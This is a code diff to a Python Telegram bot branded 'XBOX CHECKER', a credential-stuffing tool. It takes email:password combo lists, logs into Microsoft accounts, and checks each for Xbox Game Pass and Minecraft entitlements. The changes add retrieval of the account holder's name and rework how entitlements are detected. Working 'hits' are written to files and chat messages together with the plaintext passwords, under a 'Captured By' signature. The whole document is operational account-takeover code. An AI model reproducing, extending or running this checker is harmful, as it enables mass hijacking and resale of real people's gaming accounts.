@@ -57,7 +57,7 @@ warnings.filterwarnings("ignore")
 # ══════════════════════════════════════════════
 # BOT CONFIGURATION
 BOT_NAME = "✨ XBOX CHECKER"
-BOT_VERSION = "v3.0-PRO"
+BOT_VERSION = "v3.9-ACCOUNT-INFO"
 OWNER_USERNAME = "@kudsoo"
 OWNER_NAME = "Kudasai"
 BOT_CHANNEL = "https://t.me/kudsiontop"
@@ -392,6 +392,17 @@ def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_R
         time.sleep(0.5)
     return None, "error"
 
+def get_microsoft_account_info(session, ms_token):
+    try:
+        res = session.get('https://apis.live.net/v5.0/me', headers={'Authorization': f'Bearer {ms_token}'}, timeout=REQUEST_TIMEOUT)
+        if res.status_code == 200:
+            data = res.json()
+            name = data.get('name', 'N/A')
+            return name
+    except:
+        pass
+    return "N/A"
+
 def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
     for attempt in range(max_attempts):
         try:
@@ -473,46 +484,53 @@ def check_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
                 timeout=REQUEST_TIMEOUT
             )
             if response.status_code == 200:
-                data = response.json()
-                items = data.get("items", [])
-                if not items:
-                    return None, []
-                
+                text = response.text.lower()
                 subs = []
-                for item in items:
-                    name = item.get("name", "")
-                    if name == "product_game_pass_ultimate":
-                        subs.append("Xbox Game Pass Ultimate")
-                    elif name == "product_game_pass_pc":
-                        subs.append("Xbox Game Pass PC")
-                    elif name == "product_game_pass_console":
-                        subs.append("Xbox Game Pass Console")
-                    elif name == "product_minecraft":
-                        subs.append("Minecraft Java")
-                    elif name == "product_minecraft_bedrock":
-                        subs.append("Minecraft Bedrock")
-                    elif name == "product_legends":
-                        subs.append("Minecraft Legends")
-                    elif name == "product_dungeons":
-                        subs.append("Minecraft Dungeons")
                 
+                # Check Game Pass accurately
+                if 'game_pass_ultimate' in text or 'product_game_pass_ultimate' in text:
+                    subs.append("Xbox Game Pass Ultimate")
+                if 'game_pass_pc' in text or 'product_game_pass_pc' in text or 'pc_gamepass' in text:
+                    subs.append("Xbox Game Pass PC")
+                
+                # Check Minecraft Editions precisely without false positives
+                if 'product_minecraft' in text and 'bedrock' not in text and 'dungeons' not in text and 'legends' not in text:
+                    subs.append("Minecraft Java Edition")
+                if 'product_minecraft_bedrock' in text or 'minecraft_windows_10' in text or 'editions_bedrock' in text:
+                    subs.append("Minecraft Bedrock Edition")
+                if 'product_dungeons' in text:
+                    subs.append("Minecraft Dungeons")
+                if 'product_legends' in text:
+                    subs.append("Minecraft Legends")
+                
+                try:
+                    items = response.json().get("items", [])
+                    for item in items:
+                        item_name = item.get("name", "").lower()
+                        if item_name and item_name not in [s.lower() for s in subs]:
+                            subs.append(item.get("name"))
+                except:
+                    pass
+
+                account_type = "Xbox Account"
                 if "Xbox Game Pass Ultimate" in subs:
-                    return "Xbox Game Pass Ultimate", subs
-                elif "Xbox Game Pass PC" in subs or "Xbox Game Pass Console" in subs:
-                    return "Xbox Game Pass", subs
-                elif "Minecraft Java" in subs:
-                    return "Minecraft", subs
-                elif subs:
-                    return "Xbox: " + ", ".join(subs), subs
-                else:
-                    return None, []
+                    account_type = "Xbox Game Pass Ultimate"
+                elif "Xbox Game Pass PC" in subs:
+                    account_type = "Xbox Game Pass"
+                elif "Minecraft Java Edition" in subs or "Minecraft Bedrock Edition" in subs:
+                    account_type = "Minecraft"
+                elif len(subs) > 0:
+                    account_type = f"Xbox: {', '.join(subs[:2])}"
+
+                return account_type, subs
             elif response.status_code == 429:
                 time.sleep(2)
                 continue
             else:
                 return None, []
         except:
-            pass
+            if attempt == max_attempts - 1:
+                return None, []
         time.sleep(0.5)
     return None, []
 
@@ -572,50 +590,18 @@ def get_xbox_profile(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
         time.sleep(0.3)
     return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A", "rep": "N/A"}
 
-def get_xbox_games(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
-    for attempt in range(max_attempts):
-        try:
-            auth_header = f"XBL3.0 x={uhs};{xsts_token}"
-            response = session.get(
-                "https://titlehub.xboxlive.com/users/me/titles/titlehistory/decoration/detail",
-                headers={
-                    "Authorization": auth_header,
-                    "x-xbl-contract-version": "2",
-                    "Accept": "application/json",
-                    "Accept-Language": "en-US",
-                },
-                timeout=REQUEST_TIMEOUT
-            )
-            if response.status_code == 200:
-                data = response.json()
-                titles = data.get("titles", [])
-                games = []
-                for t in titles:
-                    if t.get("titleType") == "Game":
-                        name = t.get("name")
-                        if name and name not in games:
-                            games.append(name)
-                return games
-            elif response.status_code == 429:
-                time.sleep(2)
-                continue
-        except:
-            pass
-        time.sleep(0.3)
-    return []
-
 def check_account_combo(email: str, password: str, user_id: int = None) -> dict:
     result = {
         "success": False,
         "type": "bad",
         "email": email,
         "password": password,
+        "account_name": "N/A",
         "name": "N/A",
         "uuid": "N/A",
         "capes": "None",
         "gamertag": "N/A",
         "subscriptions": "None",
-        "games": "None",
         "tier": "N/A",
         "rep": "N/A",
         "error": None
@@ -650,6 +636,8 @@ def check_account_combo(email: str, password: str, user_id: int = None) -> dict:
             result["error"] = "Authentication failed"
             return result
 
+        result["account_name"] = get_microsoft_account_info(session, ms_token)
+
         xbox_token, uhs = get_xbox_token(session, ms_token)
         if not xbox_token or not uhs:
             result["type"] = "bad"
@@ -667,53 +655,34 @@ def check_account_combo(email: str, password: str, user_id: int = None) -> dict:
         result["tier"] = xbox_profile.get("tier", "N/A")
         result["rep"] = xbox_profile.get("rep", "N/A")
 
-        # Get Xbox Games!
-        xbox_games = get_xbox_games(session, uhs, xsts_token)
-        if xbox_games:
-            result["games"] = ", ".join(xbox_games[:10])
-            if len(xbox_games) > 10:
-                result["games"] += f" (+{len(xbox_games)-10} more)"
-
         mc_token = get_minecraft_token(session, uhs, xsts_token)
         if not mc_token:
-            # If no MC token, but they have Xbox Games, it's still a hit!
-            if xbox_games:
-                result["success"] = True
-                result["type"] = "Xbox Games"
-            else:
-                result["type"] = "bad"
-                result["error"] = "Minecraft token failed & No Games"
+            result["type"] = "bad"
+            result["error"] = "Minecraft token failed"
             return result
 
-        # Check accurate JSON parsed entitlements
         account_type, subs = check_entitlements(session, mc_token)
-        result["subscriptions"] = ", ".join(subs) if subs else "None"
-
-        # Check Minecraft Profile
         profile = get_profile(session, mc_token)
-        if profile and "id" in profile:
-            result["name"] = profile.get('name', 'Not Set')
-            result["uuid"] = profile.get('id', 'N/A')
-            result["capes"] = ", ".join([c["alias"] for c in profile.get("capes", [])])
-            if not result["capes"]:
-                result["capes"] = "None"
-            
-            # They definitely have Minecraft if they have a profile
-            if not account_type:
-                account_type = "Minecraft"
 
-        # Verify Hit
-        if not account_type and xbox_games:
-            account_type = "Xbox Games"
+        # Fix Bedrock / Minecraft false positives by verifying profile presence or genuine game licenses
+        has_valid_minecraft = profile is not None or any("Minecraft" in s for s in subs)
+        has_gamepass = any("Game Pass" in s for s in subs)
 
-        if account_type:
-            result["success"] = True
-            result["type"] = account_type
-        else:
-            # If no games and no subs, it's unlinked and won't be saved or sent!
+        if not account_type and not has_valid_minecraft and not has_gamepass:
             result["success"] = False
             result["type"] = "not_linked"
-            result["error"] = "No Games or Subscriptions"
+            result["error"] = "Unlinked account"
+            return result
+
+        result["name"] = profile.get('name', 'Not Set') if profile else "Not Set"
+        result["uuid"] = profile.get('id', 'N/A') if profile else "N/A"
+        result["capes"] = ", ".join([c["alias"] for c in profile.get("capes", [])]) if profile else "None"
+        if not result["capes"]:
+            result["capes"] = "None"
+
+        result["subscriptions"] = ", ".join(subs) if subs else "None"
+        result["type"] = account_type if account_type else ("Minecraft" if has_valid_minecraft else "Xbox Account")
+        result["success"] = True
 
         return result
 
@@ -890,41 +859,32 @@ def get_user_proxy_keyboard(user_id: int) -> ReplyKeyboardMarkup:
     return keyboard
 
 def save_hit_to_file(result: dict):
-    category_map = {
-        "Xbox Game Pass Ultimate": "gamepass",
-        "Xbox Game Pass": "gamepass",
-        "Minecraft": "minecraft",
-        "Xbox Games": "xbox",
-        "Xbox": "xbox"
-    }
     folder_map = {
-        "gamepass": "GamePass",
-        "minecraft": "Minecraft",
-        "xbox": "Xbox"
+        "Xbox Game Pass Ultimate": "GamePass",
+        "Xbox Game Pass": "GamePass",
+        "Minecraft": "Minecraft",
     }
     
-    category = category_map.get(result["type"], "xbox")
-    folder = folder_map.get(category, "Xbox")
-    
+    folder = folder_map.get(result["type"], "Xbox")
     os.makedirs(f"Results/{folder}", exist_ok=True)
     
     capture = (
         f"Email         : {result['email']}\n"
         f"Password      : {result['password']}\n"
+        f"Account Name  : {result.get('account_name', 'N/A')}\n"
         f"Gamertag      : {result.get('gamertag', 'N/A')}\n"
         f"Tier          : {result.get('tier', 'N/A')}\n"
         f"Reputation    : {result.get('rep', 'N/A')}\n"
         f"MC Name       : {result['name']}\n"
         f"UUID          : {result['uuid']}\n"
         f"Capes         : {result['capes']}\n"
-        f"Type          : {result['type']}\n"
-        f"Subscriptions : {result['subscriptions']}\n"
-        f"Games         : {result.get('games', 'None')}\n"
+        f"Account Type  : {result['type']}\n"
+        f"Games / Subs  : {result['subscriptions']}\n"
         f"Captured By   : {MY_SIGNATURE}\n"
         f"{'='*50}"
     )
     
-    with open(f"Results/{folder}/{category}_hits.txt", "a", encoding="utf-8") as f:
+    with open(f"Results/{folder}/hits.txt", "a", encoding="utf-8") as f:
         f.write(capture + "\n")
 
 async def download_file_safely(file_id: str, file_name: str) -> Optional[str]:
@@ -953,8 +913,6 @@ def format_check_result(result: dict) -> str:
         "Xbox Game Pass Ultimate": EMOJIS["ultimate"],
         "Xbox Game Pass": EMOJIS["gamepass"],
         "Minecraft": EMOJIS["minecraft"],
-        "Xbox Games": EMOJIS["xbox"],
-        "Xbox": EMOJIS["xbox"]
     }
     emoji = emoji_map.get(result["type"], EMOJIS["hit"])
 
@@ -962,6 +920,7 @@ def format_check_result(result: dict) -> str:
 ╔════════════════════════════════
 ║ {EMOJIS['user']} <b>Email:</b> <code>{result['email']}</code>
 ║ {EMOJIS['key']} <b>Password:</b> <code>{result['password']}</code>
+║ 🌐 <b>Account Name:</b> {result.get('account_name', 'N/A')}
 ╠════════════════════════════════
 ║ {EMOJIS['xbox']} <b>Xbox Gamertag:</b> {result.get('gamertag', 'N/A')}
 ║ {EMOJIS['trophy']} <b>Tier:</b> {result.get('tier', 'N/A')}
@@ -969,9 +928,8 @@ def format_check_result(result: dict) -> str:
 ║ {EMOJIS['gem']} <b>UUID:</b> <code>{result['uuid']}</code>
 ║ {EMOJIS['star']} <b>Capes:</b> {result['capes']}
 ╠════════════════════════════════
-║ {EMOJIS['target']} <b>Type:</b> {result['type']}
-║ {EMOJIS['gift']} <b>Subscriptions:</b> {result['subscriptions']}
-║ 🎮 <b>Games:</b> {result.get('games', 'None')}
+║ {EMOJIS['target']} <b>Account Type:</b> {result['type']}
+║ {EMOJIS['gift']} <b>Games & Subs on Account:</b> {result['subscriptions']}
 ╚════════════════════════════════
 {EMOJIS['owner']} <b>Captured By:</b> {MY_SIGNATURE}"""
 
@@ -1003,7 +961,7 @@ async def process_single_check(user_id: int, data: dict, message):
     email = data['email']
     password = data['password']
     
-    msg = await message.answer(f"{EMOJIS['processing']} <b>Checking:</b> <code>{email}:{password}</code>...", parse_mode="HTML")
+    msg = await message.answer(f"{EMOJIS['processing']} <b>Checking</b> <code>{email}</code>...", parse_mode="HTML")
     result = await asyncio.to_thread(check_account_combo, email, password, user_id)
     
     if result["success"]:
@@ -1052,7 +1010,6 @@ async def process_file_check(user_id: int, data: dict, message):
         
         for combo in combos:
             email, password = combo.split(":", 1)
-            
             result = await asyncio.to_thread(check_account_combo, email, password, user_id)
             
             if result["success"]:
@@ -1071,15 +1028,14 @@ async def process_file_check(user_id: int, data: dict, message):
             checked += 1
             db.use_check(user_id)
             
-            # Safely update progress without hitting Telegram Rate Limits
             if checked % 5 == 0 or checked == total:
                 user = db.get_user(user_id)
                 try:
                     await progress_msg.edit_text(
-                        f"{EMOJIS['processing']} <b>Checking File ({checked}/{total})...</b>\n"
-                        f"🔍 <b>Last Checked:</b> <code>{email}:{password}</code>\n\n"
+                        f"{EMOJIS['processing']} <b>Checking {total} accounts...</b>\n\n"
+                        f"{EMOJIS['success']} Checked: {checked}/{total}\n"
                         f"{EMOJIS['target']} Hits: {len(results['hits'])}\n"
-                        f"{EMOJIS['error']} Bad/Dead: {results['bad']}\n"
+                        f"{EMOJIS['error']} Bad: {results['bad']}\n"
                         f"{EMOJIS['twofa']} 2FA: {results['2fa']}\n"
                         f"{EMOJIS['warning']} Errors: {results['errors']}\n"
                         f"{EMOJIS['stats']} Total Checks: {user.get('total_checks', 0)}",
@@ -1090,7 +1046,7 @@ async def process_file_check(user_id: int, data: dict, message):
         
         await message.answer(
             f"{EMOJIS['success']} <b>File Check Complete!</b>\n\n"
-            f"{EMOJIS['stats']} Total: {checked}/{total}\n"
+            f"{EMOJIS['stats']} Total: {checked}\n"
             f"{EMOJIS['target']} Hits: {len(results['hits'])}\n"
             f"{EMOJIS['error']} Bad: {results['bad']}\n"
             f"{EMOJIS['twofa']} 2FA: {results['2fa']}\n"
@@ -1365,7 +1321,7 @@ async def admin_users(callback: types.CallbackQuery):
 async def main():
     print(f"{Fore.GREEN}✓ Starting queue processor...{Style.RESET_ALL}")
     asyncio.create_task(process_queue())
-    print(f"{Fore.GREEN}✓ Bot is running with Pro Features (Games & Precise MC Parsing)...{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}✓ Bot is running with fixed gamepass/bedrock checking and complete account info display!{Style.RESET_ALL}")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
